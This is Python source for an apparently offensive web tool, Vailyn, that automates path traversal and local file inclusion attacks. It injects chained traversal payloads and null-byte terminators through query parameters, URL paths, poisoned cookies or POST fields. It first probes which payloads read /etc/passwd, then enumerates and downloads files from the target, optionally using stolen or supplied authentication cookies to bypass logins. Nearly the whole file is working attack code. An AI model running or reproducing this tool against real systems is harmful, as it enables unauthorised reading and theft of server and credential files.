#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[Vailyn]─[~]
└──╼ VainlyStrain
"""

from core.methods.session import session
import requests, sys
from core.colors import color
from core.variables import payloadlist, nullchars
from core.methods.filecheck import filecheck
from core.methods.loot import download
from core.methods.print import progress, progresswin
from core.methods.cookie import cookieFromFile

global maxlen
maxlen = len(max(payloadlist, key=len))

"""prepare request for inpath attack"""
def inpath(traverse, dir, file, nb, url, url2):
    path=traverse+dir+file+nb+url2
    p = traverse+dir+file+nb
    req = requests.Request(method='GET', url=url)
    prep = req.prepare()
    prep.url = url + path
    return (prep, p)

"""prepare request for query attack"""
def query(traverse, dir, file, nb, keyword, url, url2):
    if "?" not in url:
        query = "?" + keyword + "=" + traverse + dir + file + nb + url2
    else:
        query = "&" + keyword + "=" + traverse + dir + file + nb + url2
    p = traverse + dir + file + nb
    req = requests.Request(method='GET', url=url)
    prep = req.prepare()
    prep.url = url + query
    return (prep, p)


"""
[Phase 1]: Vulnerability Analysis

@attack: attack mode (-a ACK)
@url: target part 1 (-v VIC)
@url2: target part 2 (-q VIC2)
@keyword: -p PAM (only for -a 1)
@cookie: cookiejar for -a 3
@selected: selected cookie to be poisoned
@verbose: print 404s?
@depth: attack depth (-d INT)
@paylist: payload list (all)
@file: file to be looked up (-i FIL, default: /etc/passwd)
@authcookie: Authentication Cookie File to bypass Login Screens
@postdata: POST Data for --attack 4
"""
def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist, file, authcookie, postdata):
    #variables for the progress counter
    requestcount = 0
    totalrequests = len(paylist) * (len(nullchars) + 1) * depth

    #resolve issues with inpath attack
    if not url.endswith("/"):
        url += "/"

    #initialize lists & session
    payloads = []
    nullbytes = []
    s = session()

    if authcookie != "":
        tmpjar = cookieFromFile(authcookie)
        for cookie in tmpjar:
            s.cookies.set_cookie(cookie)

    #initial ping for filecheck
    if attack != 4:
        con2 = s.get(url).content
    else:
        con2 = s.post(url, data={}).content
    for i in paylist:
        d = 0
        while d <= depth:
            traverse=''
            j=1
            #chain traversal payloads
            while j <= d:
                traverse+=i
                j+=1

            #send attack requests - no nullbyte injection
            requestlist = []
            if attack == 1:
                prep, p = query(traverse, "", file, "", keyword, url, url2)
                r = s.send(prep)
            elif attack == 2:
                prep, p = inpath(traverse, "", file, "", url, url2)
                r = s.send(prep)
            elif attack == 3:
                s.cookies.set(selected, traverse + file)
                p = traverse + file
                r = s.get(url)
            elif attack == 4:
                p = traverse + file
                data = {}
                for prop in postdata.split("&"):
                    pair = prop.split("=")
                    if pair[1].strip() == "INJECT":
                        pair[1] = p
                    data[pair[0].strip()] = pair[1].strip()
                assert data != {}
                r = s.post(url, data=data)
            requestlist.append((r, p, ""))

            #repeat for nullbytes
            for nb in nullchars:
                if attack == 1:
                    prep, p = query(traverse, "", file, nb, keyword, url, url2)
                    r = s.send(prep)
                elif attack == 2:
                    prep, p = inpath(traverse, "", file, nb, url, url2)
                    r = s.send(prep)
                elif attack == 3:
                    s.cookies.set(selected, traverse + file + nb)
                    p = traverse + file + nb
                    r = s.get(url)
                elif attack == 4:
                    p = traverse + file + nb
                    data = {}
                    for prop in postdata.split("&"):
                        pair = prop.split("=")
                        if pair[1].strip() == "INJECT":
                            pair[1] = p
                        data[pair[0].strip()] = pair[1].strip()
                    assert data != {}
                    r = s.post(url, data=data)
                requestlist.append((r, p, nb))

            #analyze result
            found = False
            for (r, p, nb) in requestlist:
                requestcount += 1
                if sys.platform.lower().startswith('win'):
                    if requestcount % 1000 == 0:
                        progresswin(requestcount, totalrequests, prefix=" ", suffix=" ")
                else:
                    progress(requestcount, totalrequests, prefix=" ", suffix=" ")
                if str(r.status_code).startswith("2") or r.status_code == 302 or (r.status_code == 403 and attack != 2):
                    if filecheck(r, con2, p) and attack != 4 or filecheck(r, con2, p, post=True) and attack == 4:
                        payloads.append(i)
                        if nb != "":
                            nullbytes.append(nb)
                        found = True

                        out = color.RD + "[pl]" + color.END + color.O + " " + str(r.status_code) + color.END + " "
                        out = out + "{0:{1}}".format(i, maxlen) + " " + nb

                        print(out)
            d+=1
            if found:
                break
    
    return (payloads, nullbytes)

"""
[Phase 2]: Exploitation

@attack: attack mode (-a ACK)
@url: target part 1 (-v VIC)
@url2: target part 2 (-q VIC2)
@keyword: -p PAM (only for -a 1)
@cookie: cookiejar for -a 3
@selected: selected cookie to be poisoned
@files: file list created from -l FIL ...
@dirs: directory list (permutation level based on -d INT)
@depth: attack depth (-d INT)
@verbose: print 404s?
@dl: download found files?
@selected_payloads: payloads selected in phase 1
@selected_nullbytes: terminators selected in phase 1
@authcookie: Authentication Cookie File to bypass Login Screens
@postdata: POST Data for --attack 4
"""
def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, verbose, dl, selected_payloads, selected_nullbytes, authcookie, postdata):
    #variables for the progress counter
    requestcount = 0
    if len(selected_nullbytes) == 0:
        totalrequests = len(selected_payloads) * len(files) * len(dirs) * depth
    else:
        totalrequests = len(selected_payloads) * len(selected_nullbytes) * len(files) * len(dirs) * depth

    #resolve issues with inpath attack and loot function
    if not url.endswith("/"):
        url += "/"

    #initialize lists & session
    found=[]
    urls = []
    s = session()

    if authcookie != "":
        tmpjar = cookieFromFile(authcookie)
        for cookie in tmpjar:
            s.cookies.set_cookie(cookie)

    #initial ping for filecheck
    if attack != 4:
        con2 = s.get(url).content
    else:
        con2 = s.post(url, data={}).content
    for dir in dirs:
        for file in files:
            d=1
            while d <= depth:
                for i in selected_payloads:
                    traverse=''
                    j=1
                    #chain traversal payloads
                    while j <= d:
                        traverse+=i
                        j+=1

                    #send attack requests - with or without nullbyte injection
                    requestlist = []
                    if selected_nullbytes == []:
                        data = {}
                        if attack == 1:
                            prep, p = query(traverse, dir, file, "", keyword, url, url2)
                            r = s.send(prep)
                        elif attack == 2:
                            prep, p = inpath(traverse, dir, file, "", url, url2)
                            r = s.send(prep)
                        elif attack == 3:
                            p = traverse + dir + file
                            s.cookies.set(selected, traverse + dir + file)
                            r = s.get(url)
                        elif attack == 4:
                            p = traverse + dir + file
                            for prop in postdata.split("&"):
                                pair = prop.split("=")
                                if pair[1].strip() == "INJECT":
                                    pair[1] = p
                                data[pair[0].strip()] = pair[1].strip()
                            assert data != {}
                            r = s.post(url, data=data)
                        requestlist.append((r, p, data))
                    else:
                        for nb in selected_nullbytes:
                            data = {}
                            if attack == 1:
                                prep, p = query(traverse, dir, file, nb, keyword, url, url2)
                                r = s.send(prep)
                            elif attack == 2:
                                prep, p = inpath(traverse, dir, file, nb, url, url2)
                                r = s.send(prep)
                            elif attack == 3:
                                p = traverse + dir + file + nb
                                s.cookies.set(selected, traverse + dir + file + nb)
                                r = s.get(url)
                            elif attack == 4:
                                p = traverse + dir + file + nb
                                for prop in postdata.split("&"):
                                    pair = prop.split("=")
                                    if pair[1].strip() == "INJECT":
                                        pair[1] = p
                                    data[pair[0].strip()] = pair[1].strip()
                                assert data != {}
                                r = s.post(url, data=data)
                            requestlist.append((r, p, data))

                    #analyze result
                    for (r, p, data) in requestlist:
                        requestcount += 1
                        if sys.platform.lower().startswith('win'):
                            if requestcount % 1000 == 0:
                                progresswin(requestcount, totalrequests, prefix=" ", suffix=" ")
                        else:
                            progress(requestcount, totalrequests, prefix=" ", suffix=" ")

                        if str(r.status_code).startswith("2") or r.status_code == 302:
                            if filecheck(r, con2, p) and attack != 4 or filecheck(r, con2, p, post=True) and attack == 4:
                                if attack == 1 or attack == 2:
                                    print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
                                    if dl and dir+file not in found:
                                        download(r.url,dir+file, cookie=s.cookies)
                                    found.append(dir+file)
                                    if attack == 1:
                                        urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
                                    else:
                                        vlnlist = r.url.split("/")[1::]
                                        vlnpath = ("/".join(i for i in vlnlist)).replace(url2, "")
                                        urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + vlnpath)
                                elif attack == 3:
                                    s.cookies.set(selected, p)
                                    print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"cookie"+color.END+"="+p)
                                    if dl and dir+file not in found:
                                        download(r.url,dir+file,cookie=s.cookies)
                                    found.append(dir+file)
                                    urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
                                elif attack == 4:
                                    print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"postdata"+color.END+"="+p)
                                    if dl and dir+file not in found:
                                        download(r.url,dir+file,cookie=s.cookies,post=data)
                                    found.append(dir+file)
                                    urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
                        elif r.status_code == 403 and attack != 2:
                            if attack == 1 or attack == 2:
                                print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
                                found.append(dir+file)
                                urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
                            elif attack == 3:
                                print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"cookie"+color.END+"="+p)
                                found.append(dir+file)
                                urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
                            elif attack == 4:
                                print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"postdata"+color.END+"="+p)
                                found.append(dir+file)
                                urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
                        else:
                            if verbose:
                                print(color.RD+"{}|: ".format(r.status_code)+color.END+color.RC+r.url+color.END)
                d+=1
    return (found, urls)
